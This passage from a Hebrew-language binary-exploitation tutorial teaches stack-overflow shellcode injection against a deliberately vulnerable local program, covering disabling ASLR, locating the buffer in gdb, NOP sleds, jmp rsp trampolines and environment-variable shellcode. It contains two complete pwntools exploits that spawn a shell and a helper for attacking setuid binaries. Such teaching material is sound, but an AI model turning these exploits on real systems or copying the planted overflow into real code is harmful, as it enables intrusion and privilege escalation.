+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">400</span><span class="p">);</span><span class="w">   </span><span class="c1">// read 400 bytes into a 64-byte buffer - overflow</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="p">}</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">_IONBF</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">    </span><span class="n">vuln</span><span class="p">();</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="p">}</span>
+</code></pre></div>
+<p>בחרנו ב-<code>read</code> בכוונה, ולא ב-<code>gets</code> או <code>scanf</code>. הסיבה: <code>read</code> קוראת בתים גולמיים כולל <code>\x00</code>, <code>\n</code> ורווחים. זה חשוב מאוד, כי כתובות מחסנית מכילות בתים אפסיים (במיוחד ב-64 ביט), ו-shellcode עלול להכיל בתים "מיוחדים". עם <code>gets</code> או <code>scanf("%s")</code> היינו נחסמים - נחזור לזה בסוף בסעיף המלכודות.</p>
+<h2 id="-shellcode">הבעיה הגדולה - מציאת הכתובת של ה-shellcode<a class="headerlink" href="#-shellcode" title="Permanent link">&para;</a></h2>
+<p>הinjection עצמה קלה: פשוט שולחים את הבתים. הקושי האמיתי הוא לדעת <strong>לאן לקפוץ</strong>. הכתובת של המחסנית משתנה בין מכונות, בין הרצות (עם ASLR), ואפילו לפי משתני הסביבה. נסקור שלוש דרכים, מהפשוטה למתוחכמת:</p>
+<ul>
+<li><strong>כתובת ישירה</strong> - כש-ASLR כבוי, כתובת המחסנית יציבה. מוצאים אותה פעם אחת ומשתמשים בה.</li>
+<li><strong>טרמפולינה - jmp esp / jmp rsp</strong> - קופצים דרך גאדג'ט קבוע בבינארי, בלי לדעת בכלל את כתובת המחסנית. עובד גם עם ASLR פעיל.</li>
+<li><strong>משתנה סביבה - environment variable</strong> - שמים את ה-shellcode במשתנה סביבה, שכתובתו על המחסנית ניתנת לחישוב.</li>
+</ul>
+<p>נעבור עליהן אחת-אחת.</p>
+<h2 id="-aslr">שיטה א - כתובת ישירה כש-ASLR כבוי<a class="headerlink" href="#-aslr" title="Permanent link">&para;</a></h2>
+<p>כשה-ASLR כבוי, כתובות המחסנית זהות בכל הרצה. כלומר, אם נמצא פעם אחת איפה יושב הbuffer, נוכל להשתמש באותה כתובת שוב ושוב. נכבה ASLR ברמת המערכת:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">echo</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/proc/sys/kernel/randomize_va_space
+</code></pre></div>
+<p>עכשיו נמצא את כתובת הbuffer ב-gdb. נשים breakpoint על <code>vuln</code>, נריץ, ונסתכל על ראש המחסנית:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>pwndbg&gt; break vuln
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>pwndbg&gt; run
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>pwndbg&gt; p $rsp
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>$1 = (void *) 0x7fffffffde28
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>pwndbg&gt; stack 20
+</code></pre></div>
+<p>הדרך האמינה ביותר: נשלח קלט מזהה (למשל שרשרת <code>A</code>), נעצור אחרי ה-<code>read</code>, ונחפש איפה הוא נחת:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>pwndbg&gt; search -s &quot;AAAAAAAA&quot;
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>[stack] 0x7fffffffde10 &#39;AAAAAAAA...&#39;
+</code></pre></div>
+<p>הכתובת <code>0x7fffffffde10</code> היא תחילת הbuffer. אם נשים את ה-shellcode בתחילת הbuffer, זו בדיוק הכתובת שנרצה בהreturn address.</p>
+<h3 id="gdb">המלכודת של gdb מול הרצה אמיתית<a class="headerlink" href="#gdb" title="Permanent link">&para;</a></h3>
+<p>עכשיו לנקודה שמפילה תלמידים כל שנה מחדש: <strong>הכתובת שראיתם ב-gdb כמעט תמיד שונה מהכתובת בהרצה רגילה</strong>, גם כשה-ASLR כבוי. למה? כי המחסנית נבנית מלמעלה עם משתני הסביבה (<code>envp</code>) והארגומנטים (<code>argv</code>). ה-gdb מוסיף משתני סביבה משלו (כמו <code>LINES</code> ו-<code>COLUMNS</code>) ומריץ את הבינארי עם נתיב מלא ב-<code>argv[0]</code>. כל בית נוסף בסביבה <strong>מזיז את כל המחסנית</strong>, ולכן הכתובת של <code>buf</code> זזה בהתאם.</p>
+<p>שתי דרכים להתמודד:</p>
+<ul>
+<li>לנטרל את ההבדל: להריץ ב-gdb עם <code>unset env LINES</code>, <code>unset env COLUMNS</code>, ולהיצמד לאותו <code>argv[0]</code>. או פשוט לחבר את gdb לתהליך אמיתי עם <code>gdb.attach(p)</code> מתוך pwntools, כך שהסביבה זהה.</li>
+<li>לספוג את ההבדל: להשתמש ב<strong>מזחלת NOP</strong> גדולה, שסופגת אי-דיוק של עשרות ומאות בתים. זו הדרך הקלה, ומיד נסביר אותה.</li>
+</ul>
+<h2 id="nop-nop-sled">מזחלת NOP - NOP sled<a class="headerlink" href="#nop-nop-sled" title="Permanent link">&para;</a></h2>
+<p>הבעיה: אנחנו לא יודעים את הכתובת המדויקת של ה-shellcode, אולי טעות של כמה עשרות בתים לכאן או לכאן. הפתרון קלאסי ואלגנטי. ההוראה <code>nop</code> (בית <code>0x90</code>) לא עושה כלום - היא רק מקדמת את מצביע ההוראות בבית אחד. אם נשים לפני ה-shellcode <strong>מזחלת</strong> ארוכה של הוראות <code>nop</code>, אז מספיק שנקפוץ <strong>לאנשהו בתוך המזחלת</strong>. המעבד יריץ <code>nop</code>, <code>nop</code>, <code>nop</code>... ויחליק קדימה עד שיגיע ל-shellcode.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>low addresses
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>+----------------------------+
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>| padding - 72 bytes         |  &lt;-- fills buf and saved rbp
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>+----------------------------+
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>| return address = middle of the sled |  &lt;-- no need for precision! landing anywhere in the sled is enough
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>+----------------------------+
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>| 90 90 90 90 ... (sled)     |  &lt;-- we land here, and slide forward
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>+----------------------------+
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>| shellcode                  |  &lt;-- we arrive here and execute
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>+----------------------------+
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>high addresses
+</code></pre></div>
+<p>שמנו את המזחלת וה-shellcode דווקא <strong>אחרי</strong> הreturn address. למה? כי הbuffer שלנו קטן (64 בתים) ואין בו מקום למזחלת רצינית, אבל אחרי הreturn address יש לנו את כל שאר ה-<code>read</code> (עד 400 בתים) לשחק בו. הכתובת שנשים בהreturn address מכוונת לאמצע המזחלת.</p>
+<p>על גודל המזחלת: ככל שהיא גדולה יותר, כך יש לנו יותר סובלנות לאי-דיוק בכתובת. אם ההבדל בין gdb להרצה אמיתית הוא, נניח, 200 בתים, מזחלת של 512 בתים תבלע אותו בקלות ותשאיר לנו מרווח ביטחון. כלל אצבע: מזחלת של כמה מאות בתים, ולכוון לאמצע שלה. עוד עדינות: המזחלת חייבת להיות באמת הוראות שלא משנות מצב קריטי לפני ה-shellcode. <code>0x90</code> מושלם לזה כי הוא הוראה בת בית אחד שלא נוגעת בשום רגיסטר.</p>
+<h3 id="exploit-">הexploit מלא - שיטת הכתובת הישירה<a class="headerlink" href="#exploit-" title="Permanent link">&para;</a></h3>
+<p>הנה exploit שלם ב-pwntools ל-<code>vuln64</code>, בשיטת הכתובת הישירה עם מזחלת:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln64&#39;</span><span class="p">)</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>                                  <span class="c1"># measured with cyclic (buf 64 + saved rbp 8)</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>        <span class="c1"># the hand-written shellcode from 3.1 also works</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="c1"># the address we saw in gdb, pointing into the sled (ASLR off)</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="n">ret_target</span> <span class="o">=</span> <span class="mh">0x7fffffffde90</span>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="n">sled</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">512</span>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_target</span><span class="p">)</span>                   <span class="c1"># ret jumps to the middle of the sled</span>
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">sled</span> <span class="o">+</span> <span class="n">sc</span>
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln64&#39;</span><span class="p">)</span>
+<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>איך מכוונים את <code>ret_target</code> נכון? הכי אמין: להריץ את ה-exploit פעם אחת עם <code>gdb.attach(p)</code>, לחפש את המזחלת עם <code>search -s "\x90\x90\x90\x90"</code>, ולבחור כתובת שנמצאת עמוק בתוכה. מכיוון שהמזחלת ארוכה, אפילו כתובת מוערכת בגסות תעבוד. אם זה קורס, הגדילו את המזחלת וכוונו קצת יותר גבוה.</p>
+<p>הגישה הזו נהדרת ללמידה ולאתגרים עם ASLR כבוי, אבל היא שברירית: היא תלויה בכתובת מחסנית ספציפית. ברגע שמדליקים ASLR, כתובת המחסנית משתנה בכל הרצה והשיטה מתה. בשביל זה קיימת השיטה הבאה.</p>
+<h2 id="-jmp-esp-jmp-rsp">שיטה ב - טרמפולינה עם jmp esp / jmp rsp<a class="headerlink" href="#-jmp-esp-jmp-rsp" title="Permanent link">&para;</a></h2>
+<p>זו לדעתי השיטה היפה בפרק. הרעיון: במקום לנחש את כתובת המחסנית, ננצל עובדה שאנחנו כן יודעים בוודאות. חשבו רגע מה קורה ברגע ה-<code>ret</code> של הפונקציה הvulnerable. ה-<code>ret</code> שולף את הreturn address מראש המחסנית, ובאותו רגע מצביע המחסנית <code>rsp</code> (או <code>esp</code>) מצביע בדיוק על <strong>הסלוט שמיד אחרי הreturn address</strong>.</p>
+<p>מה אם נשים את ה-shellcode בדיוק שם, מיד אחרי הreturn address? אז <code>rsp</code> מצביע עליו! נשאר רק לגרום למעבד לקפוץ אל <code>rsp</code>. וכאן הטריק: יש הוראה קטנה, <code>jmp rsp</code> (או <code>jmp esp</code> ב-32 ביט), שהקידוד שלה הוא שני בתים בלבד - <code>ff e4</code>. אם נמצא בבינארי כתובת שבה יושבים הבתים האלה, נשים אותה בהreturn address. הזרימה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>1. the ret of vuln pops the address of the &quot;jmp rsp&quot; gadget -&gt; eip jumps to the gadget
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>2. at that moment rsp points to the shellcode (the slot after the return address)
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>3. the gadget executes &quot;jmp rsp&quot; -&gt; eip jumps to the shellcode
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>4. the shellcode runs. shell.
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>low addresses (rsp after the ret)
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>+----------------------------+
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>| padding - 72 bytes         |
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>+----------------------------+
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>| return address = address of jmp rsp |  &lt;-- the ret of vuln jumps to the gadget
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>+----------------------------+
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>| shellcode                  |  &lt;-- rsp points exactly here; jmp rsp jumps here
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>+----------------------------+
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>high addresses
+</code></pre></div>
+<p>למה זה גאוני? כי <strong>לא היינו צריכים לדעת את כתובת המחסנית בכלל</strong>. הכתובת היחידה שהשתמשנו בה היא כתובת הגאדג'ט <code>jmp rsp</code>, והיא נמצאת בתוך הבינארי. מכיוון שהבינארי לא PIE, הכתובת הזו <strong>קבועה גם כש-ASLR פעיל</strong>. ה-ASLR מערבב את המחסנית, אבל לא אכפת לנו - אנחנו לא נוגעים בכתובת המחסנית, רק ב-<code>rsp</code> שממילא מצביע לאן שצריך. זו שיטה שעוקפת ASLR של המחסנית לחלוטין.</p>
+<p>איך מוצאים את הגאדג'ט? כמה דרכים:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>$<span class="w"> </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>vuln64<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;jmp rsp&#39;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>0x000000000040118f<span class="w"> </span>:<span class="w"> </span>jmp<span class="w"> </span>rsp
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>$<span class="w"> </span>objdump<span class="w"> </span>-d<span class="w"> </span>vuln64<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;ff e4&#39;</span>
+</code></pre></div>
+<p>או, הכי נוח, ישר מתוך pwntools עם חיפוש הבתים במקטעים הניתנים להרצה.</p>
+<h3 id="exploit-jmp-rsp">הexploit מלא - שיטת ה-jmp rsp<a class="headerlink" href="#exploit-jmp-rsp" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln64&#39;</span><span class="p">)</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="n">jmp_rsp</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;jmp rsp&#39;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>   <span class="c1"># searching for ff e4</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;jmp rsp @ </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">jmp_rsp</span><span class="p">)</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span>   <span class="c1"># ret jumps to jmp rsp</span>
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">sc</span>             <span class="c1"># rsp points exactly here</span>
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln64&#39;</span><span class="p">)</span>
+<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>שימו לב כמה זה נקי: אין מזחלת, אין ניחוש כתובת, אין תלות ב-ASLR של המחסנית. ב-32 ביט הכול זהה, רק מחליפים <code>jmp rsp</code> ל-<code>jmp esp</code>, <code>p64</code> ל-<code>p32</code>, ו-<code>context.arch = 'i386'</code>. הקידוד <code>ff e4</code> זהה בשתי הארכיטקטורות.</p>
+<p>נקודה עדינה ל-64 ביט: פונקציות libc "כבדות" דורשות alignment מחסנית ל-16 בתים בגלל הוראות <code>movaps</code> (ראינו את זה ב-2.3). אבל ל-shellcode שלנו זה <strong>לא רלוונטי</strong> - הוא מבצע <code>syscall</code> גולמי ולא נוגע ב-<code>movaps</code>, אז אין בעיית alignment. זו עוד סיבה שinjection shellcode פשוטה יותר מ-ret2libc.</p>
+<p>ועוד עדינות טכנית שכדאי להבין: כשה-shellcode רץ מ-<code>rsp</code> ומבצע <code>push</code>, מצביע המחסנית יורד וכותב <strong>מתחת</strong> ל-shellcode (לכתובות נמוכות, לתוך אזור הbuffer הישן), בעוד מצביע ההוראות מטפס <strong>מעל</strong> (לכתובות גבוהות). השניים מתרחקים זה מזה, ולכן ה-<code>push</code> של ה-shellcode לא דורס את ההוראות שהוא עצמו עומד להריץ. בזכות זה הטריק עובד חלק.</p>
+<h2 id="-shellcode-environment-variable">שיטה ג - shellcode במשתנה סביבה - environment variable<a class="headerlink" href="#-shellcode-environment-variable" title="Permanent link">&para;</a></h2>
+<p>לפעמים הbuffer קטן מדי בשביל shellcode + מזחלת, או שרוצים כתובת יציבה במיוחד (למשל כשתוקפים בינארי setuid נפרד). הפתרון: לשים את ה-shellcode ב<strong>משתנה סביבה</strong>. משתני הסביבה מאוחסנים בראש המחסנית, ובכתובת שאפשר לחשב כשה-ASLR כבוי.</p>
+<p>מכניסים את ה-shellcode (עם מזחלת נדיבה מקדימה) למשתנה סביבה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">SC</span><span class="o">=</span><span class="k">$(</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import sys; sys.stdout.buffer.write(b&#39;\x90&#39;*400 + open(&#39;sc.bin&#39;,&#39;rb&#39;).read())&quot;</span><span class="k">)</span>
+</code></pre></div>
+<p>עכשיו צריך לדעת באיזו כתובת המשתנה יישב על המחסנית של התוכנית הvulnerable. הכלי הקלאסי לזה הוא תוכנית עזר קטנה, <code>getenvaddr</code>, שקוראת ל-<code>getenv</code> ומדפיסה את הכתובת:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1">// getenvaddr.c</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage: %s &lt;envvar&gt; &lt;target_name&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="w">    </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="w">    </span><span class="n">ptr</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w">   </span><span class="c1">// correction based on the length of the program name</span>
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s will be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">ptr</span><span class="p">);</span>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>$<span class="w"> </span>gcc<span class="w"> </span>getenvaddr.c<span class="w"> </span>-o<span class="w"> </span>getenvaddr
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>$<span class="w"> </span>./getenvaddr<span class="w"> </span>SC<span class="w"> </span>./vuln32
